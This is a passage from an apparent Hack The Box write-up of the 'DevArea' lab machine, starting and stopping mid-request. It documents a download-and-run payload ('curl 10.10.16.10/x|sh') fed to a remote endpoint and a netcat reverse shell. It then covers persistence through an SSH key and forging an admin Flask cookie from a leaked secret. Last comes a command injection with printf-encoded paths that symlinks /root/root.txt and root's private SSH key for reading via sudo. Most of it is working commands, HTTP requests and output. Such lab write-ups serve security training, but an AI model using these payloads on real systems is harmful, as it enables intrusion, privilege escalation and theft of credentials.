Referer: http://devarea.htb:8888/dashboard
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 60

{
    "binary": "/bin/bash",
    "script": "curl 10.10.16.10/x|sh"
}


```

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.18.122] 60614
bash: cannot set terminal process group (1432): Inappropriate ioctl for device
bash: no job control in this shell
dev_ryan@devarea:/opt/HoverFly$
```

![](images/2026-03-28_20-57_burpsuite_payload_execution.png)

To establish a stable `SSH` session we wrote our public key into `dev_ryan`'s `authorized_keys` file and connected over `SSH`.

```shell
dev_ryan@devarea:~$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB8r4vPbn2m6ycgd7n22IPKG9aN7kviP37uw03woICNN' > .ssh/authorized_keys
<n22IPKG9aN7kviP37uw03woICNN' > .ssh/authorized_keys
```

```shell
┌──(kali㉿kali)-[~]
└─$ ssh dev_ryan@devarea.htb
The authenticity of host 'devarea.htb (10.129.18.122)' can't be established.
ED25519 key fingerprint is: SHA256:dVyZOiTOY7A2+yAv5PtOAnaWLDk57YxpdAZlwqfCfWE
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devarea.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-106-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Mar 28 07:58:59 PM UTC 2026

  System load:  0.0               Processes:             244
  Usage of /:   74.3% of 5.64GB   Users logged in:       0
  Memory usage: 11%               IPv4 address for eth0: 10.129.18.122
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm

dev_ryan@devarea:~$
```

## user.txt

```shell
dev_ryan@devarea:~$ cat user.txt 
1679f1c642fab9ff10cf6cc86ed441b3
```

## Enumeration (dev_ryan)

We started with the basics and checked `group memberships` and `sudo` permissions for `dev_ryan`.

```shell
dev_ryan@devarea:~$ id
uid=1001(dev_ryan) gid=1001(dev_ryan) groups=1001(dev_ryan)
```

```shell
dev_ryan@devarea:~$ sudo -l
Matching Defaults entries for dev_ryan on devarea:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev_ryan may run the following commands on devarea:
    (root) NOPASSWD: /opt/syswatch/syswatch.sh, !/opt/syswatch/syswatch.sh web-stop, !/opt/syswatch/syswatch.sh web-restart
```

The user `dev_ryan` could run `syswatch.sh` as root without a password, but the `web-stop` and `web-restart` subcommands were explicitly blocked. The script itself was not readable which was no real problem because we downloaded it already through the `LFI`.

```shell
dev_ryan@devarea:~$ cat /opt/syswatch/syswatch.sh
cat: /opt/syswatch/syswatch.sh: Permission denied
```

Running it without arguments printed the help menu, which revealed a `logs` subcommand for viewing log files.

```shell
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh
SysWatch 1.0.0
Usage: /opt/syswatch/syswatch.sh <command> [args]
Commands:
  web                 Start web GUI
  web-stop            Stop web GUI
  web-restart         Restart web GUI
  web-status          Show web GUI status
  plugin <name> [args] Execute plugin
  plugins             List available plugins
  logs <file>         View log file
  logs --list         List available log files
  --version           Show version
  --help|-h|help      Show this help
```

```shell
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh plugins
 - cpu_mem_monitor.sh
 - disk_monitor.sh
 - log_monitor.sh
 - network_monitor.sh
 - service_monitor.sh
```

Checking the locally open ports revealed that `syswatch` was listening on `127.0.0.1:7777`, confirming the internal web application.

```shell
dev_ryan@devarea:~$ ss -tulpn
Netid                                     State                                      Recv-Q                                     Send-Q                                                                         Local Address:Port                                                                           Peer Address:Port                                     Process                                                                 
udp                                       UNCONN                                     0                                          0                                                                                 127.0.0.54:53                                                                                  0.0.0.0:*                                                                                                                
udp                                       UNCONN                                     0                                          0                                                                              127.0.0.53%lo:53                                                                                  0.0.0.0:*                                                                                                                
udp                                       UNCONN                                     0                                          0                                                                                    0.0.0.0:68                                                                                  0.0.0.0:*                                                                                                                
tcp                                       LISTEN                                     0                                          4096                                                                              127.0.0.54:53                                                                                  0.0.0.0:*                                                                                                                
tcp                                       LISTEN                                     0                                          128                                                                                127.0.0.1:7777                                                                                0.0.0.0:*                                                                                                                
tcp                                       LISTEN                                     0                                          511                                                                                  0.0.0.0:80                                                                                  0.0.0.0:*                                                                                                                
tcp                                       LISTEN                                     0                                          4096                                                                                 0.0.0.0:22                                                                                  0.0.0.0:*                                                                                                                
tcp                                       LISTEN                                     0                                          100                                                                                127.0.0.1:25                                                                                  0.0.0.0:*                                                                                                                
tcp                                       LISTEN                                     0                                          4096                                                                           127.0.0.53%lo:53                                                                                  0.0.0.0:*                                                                                                                
tcp                                       LISTEN                                     0                                          50                                                                                         *:8080                                                                                      *:*                                         users:(("java",pid=1431,fd=26))                                        
tcp                                       LISTEN                                     0                                          32                                                                                         *:21                                                                                        *:*                                                                                                                
tcp                                       LISTEN                                     0                                          4096                                                                                    [::]:22                                                                                     [::]:*                                                                                                                
tcp                                       LISTEN                                     0                                          100                                                                                    [::1]:25                                                                                     [::]:*                                                                                                                
tcp                                       LISTEN                                     0                                          4096                                                                                       *:8500                                                                                      *:*                                         users:(("hoverfly",pid=1432,fd=5))                                     
tcp                                       LISTEN                                     0                                          4096                                                                                       *:8888                                                                                      *:*                                         users:(("hoverfly",pid=1432,fd=6))
```

To access the internal `SysWatch` application we set up an `SSH` port forward tunnelling `7777/TCP` to our local machine.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh -L 7777:127.0.0.1:7777 dev_ryan@devarea.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-106-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Apr  1 02:41:49 PM UTC 2026

  System load:  0.0               Processes:             242
  Usage of /:   74.1% of 5.64GB   Users logged in:       1
  Memory usage: 11%               IPv4 address for eth0: 10.129.20.228
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

dev_ryan@devarea:~$
```

The `SysWatch` login page was now accessible on `http://localhost:7777`.

![](images/2026-03-28_21-34_7777_syswatch_login.png)

Now we took a closer look at the `app.py` from the archive we previously downloaded to find something that could grant us another `Privilege Escalation` vector.

Reviewing `app.py` gave us a clear picture of the application internals, including how the `Flask` session secret was loaded and how the `/service-status` endpoint handled user input.

```shell
┌──(kali㉿kali)-[/media/…/DevArea/files/syswatch/syswatch_gui]
└─$ cat app.py 
from flask import Flask, render_template, send_from_directory, request, redirect, url_for, session, flash
from collections import deque
import os
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash
import subprocess
import re
import shutil
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get("SYSWATCH_SECRET_KEY", "change-me")
LOG_DIR = os.environ.get("SYSWATCH_LOG_DIR", "/opt/syswatch/logs")
DB_PATH = os.environ.get("SYSWATCH_DB_PATH", os.path.join(os.path.dirname(__file__), "syswatch.db"))
PLUGIN_DIR = os.environ.get("SYSWATCH_PLUGIN_DIR", "/opt/syswatch/plugins")
BACKUP_DIR = os.environ.get("SYSWATCH_BACKUP_DIR", "/opt/syswatch/backup")
APP_VERSION = os.environ.get("SYSWATCH_VERSION", "1.0.0")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        "CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, password_hash TEXT NOT NULL)"
    )
    conn.commit()
    cur.execute("SELECT COUNT(*) AS c FROM users")
    if cur.fetchone()[0] == 0:
        pwd = os.environ.get("SYSWATCH_ADMIN_PASSWORD")
        if pwd:
            cur.execute("INSERT INTO users(username, password_hash) VALUES(?, ?)", ("admin", generate_password_hash(pwd)))
            conn.commit()
    conn.close()

init_db()

LOG_FILES = {
    "CPU & Memory": "cpu-mem.log",
    "Disk Usage": "disk.log",
    "Network Traffic": "network.log",
    "Log Alerts": "log-alerts.log",
    "Service Status": "service.log"
}

PLUGIN_SCRIPTS = {
    "CPU & Memory": "cpu_mem_monitor.sh",
    "Disk Usage": "disk_monitor.sh",
    "Network Traffic": "network_monitor.sh",
    "Log Alerts": "log_monitor.sh",
    "Service Status": "service_monitor.sh",
}


def read_log_file(filename, max_lines=200):
    path = os.path.join(LOG_DIR, filename)

    # File does not exist
    if not os.path.isfile(path):
        return ["[Log file not found]"]

    try:
        with open(path, "r", errors="ignore") as f:
            return list(deque(f, maxlen=max_lines))

    except PermissionError:
        return [f"[Permission denied]: {filename}"]

    except Exception as e:
        return [f"[Error reading file {filename}]: {e}"]



def require_login():
    if not session.get("user_id"):
        return redirect(url_for("login"))

@app.route("/")
def index():
    r = require_login()
    if r:
        return r
    structured_logs = {name: {"filename": fname, "lines": read_log_file(fname)}
                       for name, fname in LOG_FILES.items()}
    return render_template("index.html", logs=structured_logs, version=APP_VERSION)

ALLOWED = set(LOG_FILES.values())

@app.route("/download/<filename>")
def download(filename):
    r = require_login()
    if r:
        return r
    if filename not in ALLOWED:
        return "Forbidden", 403
    return send_from_directory(LOG_DIR, filename, as_attachment=True)

@app.route("/service-status", methods=["GET", "POST"])
@app.route("/service-status/", methods=["GET", "POST"])

SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")

def service_status():
    r = require_login()
    if r:
        return r
    output = None
    error = None
    service = ""
    if request.method == "POST":
        service = request.form.get("service", "").strip()
        if not service or not SAFE_SERVICE.match(service):
            error = "Invalid service name"
        else:
            try:
                res = subprocess.run([f"systemctl status --no-pager {service}"], shell=True,capture_output=True, text=True, timeout=10)
                output = res.stdout if res.stdout else res.stderr
            except Exception as e:
                error = str(e)
    return render_template("service_status.html", output=output, error=error, service=service)

def safe_join(dirpath, filename):
    if not re.match(r"^[A-Za-z0-9_.-]+$", filename):
        return None
    full = os.path.abspath(os.path.join(dirpath, filename))
    base = os.path.abspath(dirpath)
    return full if full.startswith(base + os.sep) or full == base else None

@app.route("/refresh/<key>", methods=["POST"])
def refresh_log(key):
    r = require_login()
    if r:
        return r
    name = None
    for k in LOG_FILES.keys():
        if k.replace(" ", "_").lower() == key.lower():
            name = k
            break
    if not name or name not in PLUGIN_SCRIPTS:
        flash("Unknown log key")
        return redirect(url_for("index"))
    script = PLUGIN_SCRIPTS[name]
    script_path = safe_join(PLUGIN_DIR, script)
    if not script_path or not os.path.isfile(script_path):
        flash("Plugin script not found or invalid")
        return redirect(url_for("index"))
    try:
        res = subprocess.run(["bash", script_path], capture_output=True, text=True, timeout=20)
        if res.returncode == 0:
            flash(f"Refreshed: {name}")
        else:
            msg = res.stderr.strip() or "Plugin error"
            flash(f"Failed to refresh {name}: {msg}")
    except Exception as e:
        flash(f"Error: {e}")
    return redirect(url_for("index"))

@app.route("/backup-logs", methods=["POST"])
def backup_logs():
    r = require_login()
    if r:
        return r
    try:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        target = os.path.join(BACKUP_DIR, ts)
        os.makedirs(target, exist_ok=True)
        copied = []
        for fname in LOG_FILES.values():
            src_path = safe_join(LOG_DIR, fname)
            if not src_path:
                continue
            if os.path.exists(src_path):
                if os.path.isfile(src_path) or os.path.islink(src_path):
                    shutil.copy2(src_path, os.path.join(target, fname))
                    try:
                        if os.path.islink(src_path):
                            os.unlink(src_path)
                        else:
                            os.remove(src_path)
                    except Exception:
                        pass
                    with open(src_path, "w"):
                        pass
                    try:
                        os.chmod(src_path, 0o644)
                    except Exception:
                        pass
                    copied.append(fname)
        flash(f"Backed up and cleaned: {', '.join(copied)}" if copied else "No logs to backup")
    except Exception as e:
        flash(f"Backup error: {e}")
    return redirect(url_for("index"))

@app.route("/docs")
def docs():
    r = require_login()
    if r:
        return r
    return render_template("docs.html", version=APP_VERSION)


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT id, password_hash FROM users WHERE username = ?", (username,))
        row = cur.fetchone()
        conn.close()
        if row and check_password_hash(row[1], password):
            session["user_id"] = row[0]
            session["username"] = username
            return redirect(url_for("index"))
        return render_template("login.html", error="Invalid credentials", version=APP_VERSION)
    if session.get("user_id"):
        return redirect(url_for("index"))
    return render_template("login.html", version=APP_VERSION)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=7777, debug=False)
```

## Privilege Escalation to root

### Broken Authentication via exposed Secret Key in syswatch

The `app.py` code showed the `Flask` secret key was loaded from the environment variable `SYSWATCH_SECRET_KEY`. Reading `/etc/syswatch.env` — which was world-readable — revealed both the secret key and the admin password in plaintext.

```shell
dev_ryan@devarea:~$ cat /etc/syswatch.env 
SYSWATCH_SECRET_KEY=f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725
SYSWATCH_ADMIN_PASSWORD=SyswatchAdmin2026
SYSWATCH_LOG_DIR=/opt/syswatch/logs
SYSWATCH_DB_PATH=/opt/syswatch/syswatch_gui/syswatch.db
SYSWATCH_PLUGIN_DIR=/opt/syswatch/plugins
SYSWATCH_BACKUP_DIR=/opt/syswatch/backup
SYSWATCH_VERSION=1.0.0
```

With the secret key in hand we used `flask-unsign` to forge a valid session cookie for the `admin` user, bypassing the login form entirely.

```shell
┌──(kali㉿kali)-[~]
└─$ flask-unsign --sign --cookie '{"user_id": 1, "username": "admin"}' --secret 'f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725' 
eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acg94Q.T96J6_LnYvFTdMNsRcKezUqh-Tk
```

Injecting the forged cookie into the browser granted access to the `SysWatch` dashboard as `admin`.

![](images/2026-03-28_21-47_7777_authentication_bypass_cookie_preparation.png)

![](images/2026-03-28_21-46_7777_authentication_bypass.png)

### OS Command Injection

The source code review had already highlighted the vulnerable `/service-status` endpoint. The frontend enforced a strict `^[A-Za-z0-9_.-]{1,64}$` regex via JavaScript, but the server-side `SAFE_SERVICE` pattern was significantly more permissive — it only excluded a handful of characters, leaving the pipe character `|` unrestricted. Combined with `shell=True` in the `subprocess.run` call, this created a textbook `OS Command Injection` condition.

![](images/2026-03-28_21-47_7777_check_system_service_status_button.png)

```shell
<--- CUT FOR BREVITY --->
SAFE_SERVICE = re.compile(r"^[^;/\&.<>\rA-Z]*$")

subprocess.run(
    [f"systemctl status --no-pager {service}"],
    shell=True,
<--- CUT FOR BREVITY --->
```

Bypassing the client-side validation by sending a raw `POST` request with a pipe-injected `id` command confirmed execution as the `syswatch` service account.

```shell
┌──(kali㉿kali)-[/media/sf_cybersecurity/notes/HTB/Machines/DevArea/files/syswatch]
└─$ COOKIE='session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acg94Q.T96J6_LnYvFTdMNsRcKezUqh-Tk'
```

```shell
┌──(kali㉿kali)-[/media/sf_cybersecurity/notes/HTB/Machines/DevArea/files/syswatch]
└─$ curl -s -b "$COOKIE" -X POST http://127.0.0.1:7777/service-status \
  --data-urlencode $'service=ssh\nid'
<!DOCTYPE html>
<html>
<head>                                                                                                                                                                                                                                                                                                                                                                                                                                    
    <title>Check System Service Status</title>                                                                                                                                                                                                                                                                                                                                                                                            
    <link rel="stylesheet" href="/static/style.css">                                                                                                                                                                                                                                                                                                                                                                                      
</head>                                                                                                                                                                                                                                                                                                                                                                                                                                   
<body>                                                                                                                                                                                                                                                                                                                                                                                                                                    
<div class="topbar">                                                                                                                                                                                                                                                                                                                                                                                                                      
    <div class="brand">SysWatch</div>                                                                                                                                                                                                                                                                                                                                                                                                     
    <div class="user">                                                                                                                                                                                                                                                                                                                                                                                                                    
        <span>admin</span>                                                                                                                                                                                                                                                                                                                                                                                                                
        <button class="mode-toggle" id="modeToggle">Toggle Theme</button>                                                                                                                                                                                                                                                                                                                                                                 
        <a class="logout" href="/logout">Logout</a>                                                                                                                                                                                                                                                                                                                                                                                       
    </div>                                                                                                                                                                                                                                                                                                                                                                                                                                
</div>                                                                                                                                                                                                                                                                                                                                                                                                                                    
                                                                                                                                                                                                                                                                                                                                                                                                                                          
<div class="card">                                                                                                                                                                                                                                                                                                                                                                                                                        
    <h2>Check System Service Status</h2>                                                                                                                                                                                                                                                                                                                                                                                                  
    <form method="post" action="/service-status" id="svcForm" style="display:flex; gap:8px; align-items:center;">                                                                                                                                                                                                                                                                                                                         
        <input type="text" id="serviceInput" name="service" placeholder="e.g. ssh" value="ssh                                                                                                                                                                                                                                                                                                                                             
id" required pattern="^[A-Za-z0-9_.-]{1,64}$" maxlength="64" autocomplete="off" spellcheck="false" style="flex:1; padding:8px; border-radius:4px; border:1px solid #333; background: var(--bg); color: var(--text);">
        <button type="submit" id="submitBtn" class="download">Check</button>
        <a href="/" class="action">Back to Dashboard</a>
    </form>
    <div id="clientError" class="error" style="display:none; margin-top:8px;">Allowed: letters, numbers, dot, dash, underscore</div>
</div>




<div class="card">
    <h3>Result</h3>
    <div class="log-box"><pre>● ssh.service - OpenBSD Secure Shell server
     Loaded: loaded (/usr/lib/systemd/system/ssh.service; disabled; preset: enabled)
     Active: active (running) since Sat 2026-03-28 19:04:43 UTC; 1h 59min ago
TriggeredBy: ● ssh.socket
       Docs: man:sshd(8)
             man:sshd_config(5)
    Process: 1943 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
   Main PID: 1945 (sshd)
      Tasks: 1 (limit: 4546)
     Memory: 6.0M (peak: 20.7M)
        CPU: 467ms
     CGroup: /system.slice/ssh.service
             └─1945 &#34;sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&#34;
uid=984(syswatch) gid=984(syswatch) groups=984(syswatch)
</pre></div>
    <div style="margin-top:10px;"><a class="action" href="/service-status">Check Another Service</a></div>
    <div style="margin-top:10px;"><a class="action" href="/">Back to Dashboard</a></div>
    </div>


</body>
<script>
const re = /^[A-Za-z0-9_.-]{1,64}$/;
const input = document.getElementById('serviceInput');
const form = document.getElementById('svcForm');
const err = document.getElementById('clientError');
const btn = document.getElementById('submitBtn');
function validate() {
  const v = input.value.trim();
  const ok = re.test(v);
  err.style.display = ok ? 'none' : 'block';
  btn.disabled = !ok;
  return ok;
}
input.addEventListener('input', validate);
form.addEventListener('submit', function(e){ if(!validate()){ e.preventDefault(); }});
</script>
<script>
const k='syswatch-theme';
const prefers=window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';
let t=localStorage.getItem(k)||prefers;
document.documentElement.setAttribute('data-theme', t);
const b=document.getElementById('modeToggle');
if(b){
  b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  b.onclick=function(){
    t=t==='dark'?'light':'dark';
    localStorage.setItem(k,t);
    document.documentElement.setAttribute('data-theme', t);
    b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  };
}
</script>
</html>
```

```shell
<--- CUT FOR BREVITY --->
     CGroup: /system.slice/ssh.service
             └─1945 &#34;sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&#34;
uid=984(syswatch) gid=984(syswatch) groups=984(syswatch)
</pre></div>
<--- CUT FOR BREVITY --->
```

Since `syswatch.sh` ran as root, and the `logs` subcommand read files from `/opt/syswatch/logs/`, the strategy was to use the `OS Command Injection` to plant symlinks inside the logs directory pointing to privileged files, then read them back through `sudo /opt/syswatch/syswatch.sh logs`. The `syswatch` service account had write permissions to `/opt/syswatch/logs/`, making this approach viable.

The first step was to create a symlink `hop2.log` pointing to `/root/root.txt`.

```shell
service=a%7cln%20-sf%20%24(printf%20%27%5c057root%5c057root%5c056txt%27)%20%24(printf%20%27%5c057opt%5c057syswatch%5c057logs%5c057hop2%5c056log%27)
```

```shell
POST /service-status HTTP/1.1
Host: localhost:7777
Content-Length: 147
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost:7777
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:7777/service-status
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acg94Q.T96J6_LnYvFTdMNsRcKezUqh-Tk
Connection: keep-alive

service=a%7cln%20-sf%20%24(printf%20%27%5c057root%5c057root%5c056txt%27)%20%24(printf%20%27%5c057opt%5c057syswatch%5c057logs%5c057hop2%5c056log%27)
```

```shell
HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.3
Date: Sat, 28 Mar 2026 21:15:45 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2720
Vary: Cookie
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Check System Service Status</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="topbar">
    <div class="brand">SysWatch</div>
    <div class="user">
        <span>admin</span>
        <button class="mode-toggle" id="modeToggle">Toggle Theme</button>
        <a class="logout" href="/logout">Logout</a>
    </div>
</div>

<div class="card">
    <h2>Check System Service Status</h2>
    <form method="post" action="/service-status" id="svcForm" style="display:flex; gap:8px; align-items:center;">
        <input type="text" id="serviceInput" name="service" placeholder="e.g. ssh" value="a|ln -sf $(printf &#39;\057root\057root\056txt&#39;) $(printf &#39;\057opt\057syswatch\057logs\057hop2\056log&#39;)" required pattern="^[A-Za-z0-9_.-]{1,64}$" maxlength="64" autocomplete="off" spellcheck="false" style="flex:1; padding:8px; border-radius:4px; border:1px solid #333; background: var(--bg); color: var(--text);">
        <button type="submit" id="submitBtn" class="download">Check</button>
        <a href="/" class="action">Back to Dashboard</a>
    </form>
    <div id="clientError" class="error" style="display:none; margin-top:8px;">Allowed: letters, numbers, dot, dash, underscore</div>
</div>




<div class="card">
    <h3>Result</h3>
    <div class="log-box"><pre>Unit a.service could not be found.
</pre></div>
    <div style="margin-top:10px;"><a class="action" href="/service-status">Check Another Service</a></div>
    <div style="margin-top:10px;"><a class="action" href="/">Back to Dashboard</a></div>
    </div>


</body>
<script>
const re = /^[A-Za-z0-9_.-]{1,64}$/;
const input = document.getElementById('serviceInput');
const form = document.getElementById('svcForm');
const err = document.getElementById('clientError');
const btn = document.getElementById('submitBtn');
function validate() {
  const v = input.value.trim();
  const ok = re.test(v);
  err.style.display = ok ? 'none' : 'block';
  btn.disabled = !ok;
  return ok;
}
input.addEventListener('input', validate);
form.addEventListener('submit', function(e){ if(!validate()){ e.preventDefault(); }});
</script>
<script>
const k='syswatch-theme';
const prefers=window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';
let t=localStorage.getItem(k)||prefers;
document.documentElement.setAttribute('data-theme', t);
const b=document.getElementById('modeToggle');
if(b){
  b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  b.onclick=function(){
    t=t==='dark'?'light':'dark';
    localStorage.setItem(k,t);
    document.documentElement.setAttribute('data-theme', t);
    b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  };
}
</script>
</html>
```

Next we linked `hop1.log` to `hop2.log`, creating a two-hop symlink chain so that the `syswatch.sh logs hop1.log` command would ultimately resolve to `/root/root.txt`.

```shell
service=a%7cln%20-sf%20hop2%24(printf%20%27%5c056log%27)%20%24(printf%20%27%5c057opt%5c057syswatch%5c057logs%5c057hop1%5c056log%27)
```

```shell
POST /service-status HTTP/1.1
Host: localhost:7777
Content-Length: 131
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost:7777
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:7777/service-status
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.acg94Q.T96J6_LnYvFTdMNsRcKezUqh-Tk
Connection: keep-alive

service=a%7cln%20-sf%20hop2%24(printf%20%27%5c056log%27)%20%24(printf%20%27%5c057opt%5c057syswatch%5c057logs%5c057hop1%5c056log%27)
```

```shell
HTTP/1.1 200 OK
Server: Werkzeug/3.1.4 Python/3.12.3
Date: Sat, 28 Mar 2026 21:15:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 2708
Vary: Cookie
Connection: close

<!DOCTYPE html>
<html>
<head>
    <title>Check System Service Status</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="topbar">
    <div class="brand">SysWatch</div>
    <div class="user">
        <span>admin</span>
        <button class="mode-toggle" id="modeToggle">Toggle Theme</button>
        <a class="logout" href="/logout">Logout</a>
    </div>
</div>

<div class="card">
    <h2>Check System Service Status</h2>
    <form method="post" action="/service-status" id="svcForm" style="display:flex; gap:8px; align-items:center;">
        <input type="text" id="serviceInput" name="service" placeholder="e.g. ssh" value="a|ln -sf hop2$(printf &#39;\056log&#39;) $(printf &#39;\057opt\057syswatch\057logs\057hop1\056log&#39;)" required pattern="^[A-Za-z0-9_.-]{1,64}$" maxlength="64" autocomplete="off" spellcheck="false" style="flex:1; padding:8px; border-radius:4px; border:1px solid #333; background: var(--bg); color: var(--text);">
        <button type="submit" id="submitBtn" class="download">Check</button>
        <a href="/" class="action">Back to Dashboard</a>
    </form>
    <div id="clientError" class="error" style="display:none; margin-top:8px;">Allowed: letters, numbers, dot, dash, underscore</div>
</div>




<div class="card">
    <h3>Result</h3>
    <div class="log-box"><pre>Unit a.service could not be found.
</pre></div>
    <div style="margin-top:10px;"><a class="action" href="/service-status">Check Another Service</a></div>
    <div style="margin-top:10px;"><a class="action" href="/">Back to Dashboard</a></div>
    </div>


</body>
<script>
const re = /^[A-Za-z0-9_.-]{1,64}$/;
const input = document.getElementById('serviceInput');
const form = document.getElementById('svcForm');
const err = document.getElementById('clientError');
const btn = document.getElementById('submitBtn');
function validate() {
  const v = input.value.trim();
  const ok = re.test(v);
  err.style.display = ok ? 'none' : 'block';
  btn.disabled = !ok;
  return ok;
}
input.addEventListener('input', validate);
form.addEventListener('submit', function(e){ if(!validate()){ e.preventDefault(); }});
</script>
<script>
const k='syswatch-theme';
const prefers=window.matchMedia('(prefers-color-scheme: dark)').matches?'dark':'light';
let t=localStorage.getItem(k)||prefers;
document.documentElement.setAttribute('data-theme', t);
const b=document.getElementById('modeToggle');
if(b){
  b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  b.onclick=function(){
    t=t==='dark'?'light':'dark';
    localStorage.setItem(k,t);
    document.documentElement.setAttribute('data-theme', t);
    b.textContent=t==='dark'?'Light Mode':'Dark Mode';
  };
}
</script>
</html>
```

## root.txt

With the symlink chain in place, invoking `syswatch.sh logs hop1.log` as root followed the chain through to `/root/root.txt`.

```shell
dev_ryan@devarea:~$ sudo /opt/syswatch/syswatch.sh logs hop1.log
8fc290fddaa3fbfbd55d5e6f211ac87d
```

## Post Exploitation

To demonstrate the full impact of the `OS Command Injection` vulnerability, the same symlink technique was used to expose the root `SSH` private key. A symlink `hop2.log` was first pointed to `/root/.ssh/id_ed25519`, then `hop1.log` was linked to `hop2.log`.

```shell
POST /service-status HTTP/1.1
Host: localhost:7777
Content-Length: 147
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="145", "Not:A-Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: http://localhost:7777
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
